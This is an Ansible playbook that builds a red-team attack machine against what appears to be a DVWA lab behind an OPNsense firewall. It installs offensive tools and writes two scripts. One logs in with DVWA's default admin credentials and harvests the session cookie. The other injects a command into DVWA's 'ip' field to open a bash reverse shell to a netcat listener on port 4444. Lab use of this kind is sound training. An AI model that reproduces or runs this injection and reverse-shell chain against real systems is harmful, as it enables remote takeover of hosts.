---
- name: Preparar entorno avanzado de ataque Red Team (Alta Concurrencia)
  hosts: redteam
  become: yes

  tasks:
    - name: Actualizar repositorios base
      ansible.builtin.apt:
        update_cache: yes
        upgrade: dist
        cache_valid_time: 3600

    - name: Instalar arsenal de Pentesting y utilidades de rendimiento
      ansible.builtin.apt:
        name:
          - nmap       # Escaneo de puertos y evasión de firewalls
          - sqlmap     # Inyecciones SQL automatizadas
          - ffuf       # Fuzzing web ultrarrápido
          - nikto      # Escáner de vulnerabilidades web
          - hydra      # Fuerza bruta paralela
          - tmux       # Multiplexor de terminal
          - htop       # Monitorización de recursos
          - curl
          - wget
          - python3
          - python3-pip
          - python3-bs4
          - python3-requests
          - git
        state: present

    - name: Optimizar OS para ataques de alta concurrencia (File Descriptors)
      ansible.builtin.blockinfile:
        path: /etc/security/limits.conf
        block: |
          * soft nofile 65535
          * hard nofile 65535
          root soft nofile 65535
          root hard nofile 65535
      notify: Aplicar sysctl

    - name: Clonar repositorio SecLists (Diccionarios de payloads)
      ansible.builtin.git:
        repo: 'https://github.com/danielmiessler/SecLists.git'
        dest: /opt/SecLists
        depth: 1

    - name: Configurar permisos para SecLists
      ansible.builtin.file:
        path: /opt/SecLists
        state: directory
        mode: '0755'
    - name: Asegurar que existe el directorio de scripts en Red Team
      ansible.builtin.file:
        path: /home/walter/scripts
        state: directory
        owner: walter
        group: walter
        mode: '0755'

    - name: Script recolector de cookies (Python)
      ansible.builtin.copy:
        dest: /home/walter/scripts/get_cookie.py
        owner: walter
        mode: '0755'
        content: |
          import requests
          from bs4 import BeautifulSoup

          # Configuración de URLs (IP de la WAN de OPNsense)
          url_base = "http://192.168.122.144"
          url_login = f"{url_base}/login.php"

          def obtener_cookie():
              s = requests.Session()
              
              # 1. Obtener el Token CSRF inicial
              r_get = s.get(url_login)
              soup = BeautifulSoup(r_get.text, 'html.parser')
              try:
                  token = soup.find('input', {'name': 'user_token'})['value']
              except TypeError:
                  return "ERROR: No se pudo encontrar el token CSRF"

              # 2. Realizar el Login
              datos_login = {
                  'username': 'admin',
                  'password': 'password',
                  'Login': 'Login',
                  'user_token': token
              }
              r_post = s.post(url_login, data=datos_login)

              # Verificación de éxito 
              if "login.php" in r_post.url:
                  return "ERROR: Login fallido (revisa credenciales)"

              # 3. Extraer y devolver la cookie formateada
              cookie_dict = s.cookies.get_dict()
              if 'PHPSESSID' in cookie_dict:
                  # Devolvemos la cadena exacta
                  return f"PHPSESSID={cookie_dict['PHPSESSID']}; security=low"
              
              return "ERROR: No se encontró la cookie PHPSESSID"

          if __name__ == "__main__":
              # Imprimimos el resultado de la función "obtener_cookies()"
              resultado = obtener_cookie()
              print(resultado)

    - name: Script ataque Reverse-Shell
      ansible.builtin.copy:
        dest: /home/walter/scripts/ataque_reverse_shell.sh
        owner: walter
        mode: '0755'
        content: |
          #!/bin/bash

          if [ "$1" == "escucha" ]; then
              echo "[+] Iniciando listener en el puerto 4444..."
              nc -lvnp 4444

          elif [ "$1" == "ataque" ]; then
              echo "[+] Lanzando payload contra DVWA a traves del firewall..."
              curl -s -X POST "http://192.168.122.144/vulnerabilities/exec/" \
                -H "Cookie: $(python3 /home/walter/scripts/get_cookie.py)" \
                --data-urlencode "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.122.84/4444 0>&1'" \
                --data-urlencode "Submit=Submit"

          else
              echo "Uso incorrecto."
              echo "Para escuchar: ./ataque_reverse_shell.sh escucha"
              echo "Para atacar:   ./ataque_reverse_shell.sh ataque"
          fi

  handlers:
    - name: Aplicar sysctl
      ansible.builtin.command: sysctl -p
